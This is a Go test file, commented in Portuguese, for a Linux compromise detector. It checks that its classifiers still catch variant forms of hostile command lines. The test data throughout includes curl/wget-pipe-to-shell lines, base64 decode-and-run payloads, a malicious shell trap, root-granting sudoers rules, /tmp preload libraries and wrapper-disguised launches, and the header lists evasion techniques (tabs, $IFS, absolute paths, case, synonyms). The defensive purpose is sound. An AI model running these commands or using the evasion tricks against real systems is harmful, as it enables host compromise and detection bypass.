// Tabela de evasões dos classificadores de CONTEÚDO.
//
// Existe porque a catraca de cenário (test/scenario) responde uma pergunta —
// "este check dispara?" — e é estruturalmente cega para a seguinte: "ele dispara
// sobre as VARIANTES?". Um cenário planta a forma que o autor escreveu; o
// adversário escolhe outra. Seis checks com cenário verde perdiam
// `curl … | /bin/sh` porque pipesToShell casava prefixo literal.
//
// Toda linha aqui é uma forma que já foi usada, ou que custa um byte a mais que
// a forma coberta. O eixo dominante é o SEPARADOR: todo padrão com espaço
// embutido — "curl ", " -c", "base64 -d", "trap ", "source " — é evadido com
// tab, espaço duplo ou $IFS, e quem escolhe o byte é quem escreve a linha.
//
// Os outros eixos:
//
//	caminho absoluto   /bin/sh no lugar de sh
//	prefixo            sudo, env, nohup, setsid antes do comando de verdade
//	aspas              o token vem de dentro de `sh -c "…"` e carrega pontuação
//	caixa              CURL, Base64
//	sinônimo           fetch e lwp-download entregam o que curl entrega
//
// Uma linha que passa a falhar aqui é uma regressão de DETECÇÃO, não de
// formatação: alguém estreitou um classificador e abriu uma porta.

package checks

import (
	"testing"

	"github.com/lex0c/aletheia/internal/check"
)

type ev struct {
	in    string
	quero bool
	nota  string
}

func roda(t *testing.T, nome string, f func(string) bool, casos []ev) {
	t.Helper()
	for _, c := range casos {
		if got := f(c.in); got != c.quero {
			t.Errorf("[%s] %-58q = %v, quer %v  (%s)", nome, c.in, got, c.quero, c.nota)
		}
	}
}

// ---------------------------------------------------------------- baixa-e-executa
func TestEvasaoBaixaEExecuta(t *testing.T) {
	f := func(s string) bool { _, _, ok := execSuspect(s); return ok }
	roda(t, "execSuspect/download", f, []ev{
		{"/bin/sh -c 'curl -s http://e/i | sh'", true, "forma base"},
		{"/bin/sh -c 'curl -s http://e/i | /bin/sh'", true, "interpretador por caminho absoluto"},
		{"/bin/sh -c 'curl\t-s http://e/i | sh'", true, "TAB depois de curl"},
		{"/bin/sh -c 'CURL -s http://e/i | sh'", true, "caixa alta"},
		{"/bin/sh -c '/usr/bin/curl -s http://e/i | sh'", true, "curl por caminho absoluto"},
		{"/bin/sh -c 'wget -qO- http://e/i | sh'", true, "wget"},
		{"/bin/sh -c 'busybox wget -qO- http://e/i | sh'", true, "busybox wget"},
		{"/bin/sh -c 'curl -s http://e/i|sudo sh'", true, "sudo antes do shell"},
		{"/bin/sh -c 'curl -s http://e/i | env sh'", true, "env antes do shell"},
		{"/bin/sh -c 'echo aGk= | base64 -d | sh'", true, "base64 -d"},
		{"/bin/sh -c 'echo aGk= | base64  -d | sh'", true, "espaço duplo em base64 -d"},
		{"/bin/sh -c 'echo aGk= | base64 -di | sh'", true, "flag colada -di"},
		{"/bin/sh -c 'fetch -o- http://e/i | sh'", true, "fetch (BSD/alpine)"},
		{"/usr/bin/backup --to /srv | gzip > /b.gz", false, "pipe legítimo"},
	})
}

// ---------------------------------------------------------------- interpretador em linha
func TestEvasaoInterpretadorEmLinha(t *testing.T) {
	roda(t, "temInterpretadorEmLinha", temInterpretadorEmLinha, []ev{
		{"python3 -c \"import os\"", true, "forma base"},
		{"python3\t-c \"import os\"", true, "TAB antes de -c"},
		{"python3 -c'import os'", true, "-c colado na aspa"},
		{"perl -e 'print 1'", true, "perl -e"},
		{"/usr/bin/python3 -c 'x'", true, "caminho absoluto"},
		{"node -e 'x'", true, "node"},
		{"/usr/bin/backup -c /etc/b.conf", false, "nenhum interpretador no nome: -c de config não basta"},
	})
	roda(t, "ofuscaPayload", ofuscaPayload, []ev{
		{"python3 -c 'exec(base64.b64decode(x))'", true, "forma base"},
		{"echo x | base64 -d", true, "base64 -d"},
		{"echo x | base64  -d", true, "espaço duplo"},
		{"echo x | base64 -di", true, "flag colada"},
		{"echo x | openssl enc -d -a", true, "openssl"},
		{"python3 -c 'eval (x)'", true, "espaço antes do parêntese"},
		{"python3 -c 'exec  (x)'", true, "espaço duplo antes do parêntese"},
		{"php -r 'eval($x);'", true, "php eval"},
		{"echo x | xxd -r -p", true, "xxd sem pipe adjacente"},
		{"/usr/bin/backup --dest /srv", false, "linha limpa"},
	})
}

// ---------------------------------------------------------------- trap de shell
func TestEvasaoTrapDeShell(t *testing.T) {
	f := func(s string) bool { _, ok := trapDeShell(s); return ok }
	roda(t, "trapDeShell", f, []ev{
		{"trap 'curl http://e|sh' debug", true, "forma base"},
		{"trap\t'curl http://e|sh' debug", true, "TAB depois de trap"},
		{"trap  'x' exit", true, "espaço duplo"},
		{"; trap 'x' err", true, "depois de ponto e vírgula"},
		{"/usr/bin/mytrap x debug", false, "trap no meio de outra palavra"},
		{"trap - int", false, "restaura o padrão: não executa"},
	})
}

// ---------------------------------------------------------------- diretório suspeito
func TestEvasaoDiretorioSuspeito(t *testing.T) {
	f := func(s string) bool { _, ok := suspectDir(s); return ok }
	roda(t, "suspectDir", f, []ev{
		{"/tmp/.x", true, "forma base"},
		{"/var/tmp/.x", true, "var/tmp"},
		{"/dev/shm/.x", true, "tmpfs"},
		{"/tmp/./x", true, "ponto no meio do caminho"},
		{"/tmp//x", true, "barra dupla"},
		{"/usr/local/bin/app", false, "instalação manual legítima"},
		{"/home/ana/.local/bin/app", false, "XDG: pipx/pip --user"},
	})
}

// ---------------------------------------------------------------- shell em modprobe
func TestEvasaoChamaShell(t *testing.T) {
	roda(t, "chamaShell", chamaShell, []ev{
		{"/bin/sh -c 'x'", true, "forma base"},
		{"/bin/bash -c 'x'", true, "bash"},
		{"sudo /bin/sh -c x", true, "prefixado por sudo"},
		{"/usr/bin/modprobe nf_tables", false, "carga legítima"},
	})
}

// ---------------------------------------------------------------- sudoers
func TestEvasaoSudoers(t *testing.T) {
	fRoot := func(s string) bool { ok, _ := viraRoot(s); return ok }
	roda(t, "viraRoot", fRoot, []ev{
		{"ana ALL=(ALL) NOPASSWD: ALL", true, "ALL como runas"},
		{"ana ALL=(root) NOPASSWD: ALL", true, "root nomeado"},
		{"ana ALL=(#0) NOPASSWD: ALL", true, "root por UID numérico"},
		{"ana ALL=(ALL:ALL) NOPASSWD: ALL", true, "usuário:grupo"},
		{"ana ALL=(root:root) NOPASSWD: ALL", true, "root:root"},
		{"ana ALL=( root ) NOPASSWD: ALL", true, "espaço dentro do runas"},
		{"ana ALL=(postgres) NOPASSWD: ALL", false, "outra conta não é root"},
		{"ana ALL=NOPASSWD: ALL", true, "sem runas: root é o padrão"},
	})
	roda(t, "regraAmpla", regraAmpla, []ev{
		{"ana ALL=(ALL) NOPASSWD: ALL", true, "forma base"},
		{"ana ALL=(ALL) NOPASSWD:ALL", true, "sem espaço depois dos dois-pontos"},
		{"ana ALL=(ALL) NOPASSWD: /bin/ls, ALL", true, "ALL no fim de uma lista"},
		{"ana ALL=(ALL) NOPASSWD:\tALL", true, "TAB depois dos dois-pontos"},
		{"ana ALL=(ALL) NOPASSWD: /usr/bin/systemctl", false, "comando nomeado"},
	})
}

// ---------------------------------------------------------------- ld.so.preload
func TestEvasaoPreload(t *testing.T) {
	f := func(s string) bool { sev, _ := preloadSev(s); return sev == check.SevCritical }
	roda(t, "preloadSev", f, []ev{
		{"/tmp/x.so", true, "tmp"},
		{"/dev/shm/x.so", true, "tmpfs"},
		{"/usr/lib/legit.so", false, "diretório de biblioteca"},
		{"/usr/lib/a.so:/tmp/x.so", true, "segunda lib da lista é a maliciosa"},
		{"/usr/lib/a.so /tmp/x.so", true, "separado por espaço"},
		{"/usr/lib/a.so\t/tmp/x.so", true, "separado por TAB"},
	})
}

// ---------------------------------------------------------------- ftrace
func TestEvasaoPareceEBPF(t *testing.T) {
	roda(t, "pareceEBPF", pareceEBPF, []ev{
		{"bpf_trampoline_6442509+0x4c/0x1000", true, "trampolim de fentry"},
		{"bpf_dispatcher_xdp+0x0/0x10", true, "dispatcher"},
		{"meu_rootkit_hook+0x0/0x40 [evil]", false, "hook de módulo não é eBPF"},
		{"ftrace_caller+0x5b/0x90", false, "trampolim genérico não é eBPF"},
	})
}

// ---------------------------------------------------------------- linhas de gatilho
func TestEvasaoLinhaExecutavel(t *testing.T) {
	casos := []struct{ in, quero, nota string }{
		{"source /tmp/.x", "/tmp/.x", "source"},
		{". /tmp/.x", "/tmp/.x", "ponto"},
		{"eval /tmp/.x", "/tmp/.x", "eval"},
		{"exec /tmp/.x", "/tmp/.x", "exec"},
		{"source\t/tmp/.x", "/tmp/.x", "TAB depois de source"},
		{".\t/tmp/.x", "/tmp/.x", "TAB depois do ponto"},
		{"source  /tmp/.x", "/tmp/.x", "espaço duplo"},
		{`|"/tmp/.x"`, "/tmp/.x", "alias com aspas"},
		{"|/tmp/.x", "/tmp/.x", "alias sem aspas"},
		{"XCONSOLE=/dev/xconsole", "XCONSOLE=/dev/xconsole", "variável comum é DADO, não programa"},
	}
	for _, c := range casos {
		if got := linhaExecutavel(c.in); got != c.quero {
			t.Errorf("[linhaExecutavel] %-28q = %q, quer %q  (%s)", c.in, got, c.quero, c.nota)
		}
	}
}

// ---------------------------------------------------------------- cron da distro
func TestEvasaoAgendadorDaDistro(t *testing.T) {
	roda(t, "agendadorDaDistro", agendadorDaDistro, []ev{
		{"run-parts --report /etc/cron.hourly", true, "o agendador de fábrica"},
		{"cd / && run-parts --report /etc/cron.daily", true, "com cd antes"},
		{"run-parts /etc/cron.backup", false, "diretório que nenhuma distro cria"},
		{"run-parts /tmp/meus", false, "diretório do atacante"},
	})
}

// ---------------------------------------------------------------- alvo efetivo (wrapper)
//
// "O primeiro executável" virou uma regra de evasão comum entre systemd,
// gatilho e inetd/xinetd: todo wrapper legítimo — sudo, env, sh -c, tcpd —
// deixa a si mesmo como primeiro token e empurra o payload para o argumento.
// alvoEfetivo desembrulha; este bloco é a rede que impede alguém de estreitá-lo
// e reabrir a porta. Testa-se pela DECISÃO real (execSuspect), não pelo formato
// do alvo: o eixo é o WRAPPER, e cada linha custa um prefixo a mais.
func TestEvasaoAlvoEfetivo(t *testing.T) {
	f := func(s string) bool { _, _, ok := execSuspect(s); return ok }
	roda(t, "execSuspect/wrapper", f, []ev{
		{"/tmp/.x", true, "sem wrapper: forma base"},
		{"sudo /tmp/.x", true, "sudo"},
		{"/usr/bin/env /tmp/.x", true, "env por caminho"},
		{"env FOO=bar /tmp/.x", true, "env com VAR=val antes do alvo"},
		{"nohup /tmp/.x", true, "nohup"},
		{"setsid /tmp/.x", true, "setsid"},
		{"doas /tmp/.x", true, "doas"},
		{"exec /tmp/.x", true, "exec"},
		{"stdbuf -oL /tmp/.x", true, "stdbuf com flag"},
		{"/usr/sbin/tcpd /tmp/.x", true, "tcpd (NAMEINARGS do inetd)"},
		{"ionice -c3 /tmp/.x", true, "ionice com flag"},
		{"nice -n 10 /tmp/.x", true, "nice com flag e valor"},
		{"timeout 30 /tmp/.x", true, "timeout: 30 é duração, não o alvo"},
		{"timeout 1.5h /tmp/.x", true, "timeout com sufixo de hora"},
		{"sh -c /tmp/.x", true, "sh -c com caminho nu"},
		{"/bin/sh -c /tmp/.x", true, "sh por caminho absoluto"},
		{"bash -c '/tmp/.x -flag'", true, "bash -c com aspas e flag"},
		{"sudo env nohup /tmp/.x", true, "wrappers aninhados"},
		{"tcpd sh -c /tmp/.x", true, "tcpd embrulhando sh -c"},
		// Negativos: o alvo real é legítimo, mesmo embrulhado.
		{"/usr/bin/legit", false, "programa legítimo sem wrapper"},
		{"sudo /usr/bin/legit", false, "sudo não torna legítimo suspeito"},
		{"sh -c /usr/bin/legit", false, "sh -c de um caminho legítimo"},
		{"env /usr/sbin/sshd", false, "env de daemon legítimo"},
	})
}
